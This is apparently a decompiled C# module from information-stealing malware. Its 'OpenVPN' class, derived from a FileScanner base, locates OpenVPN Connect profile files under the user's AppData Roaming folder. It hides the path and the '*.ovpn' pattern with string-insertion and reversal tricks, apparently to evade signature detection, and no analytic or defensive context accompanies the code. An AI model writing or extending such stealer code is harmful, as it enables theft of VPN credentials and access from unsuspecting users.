using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

// Token: 0x0200002A RID: 42
public class OpenVPN : FileScanner
{
	// Token: 0x060000D8 RID: 216 RVA: 0x00003867 File Offset: 0x00001A67
	public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
	{
		return string.Empty;
	}

	// Token: 0x060000D9 RID: 217 RVA: 0x00008EE4 File Offset: 0x000070E4
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			list.Add(new FileScannerArg
			{
				Directory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPFile.WriteROFILE%\\AppFile.WriteData\\RoamiFile.Writeng").Replace("File.Write", string.Empty), "OpenVPN Connect" + "\\" + "profiles"),
				Pattern = new string("npvo*".Reverse<char>().ToArray<char>()),
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}
}
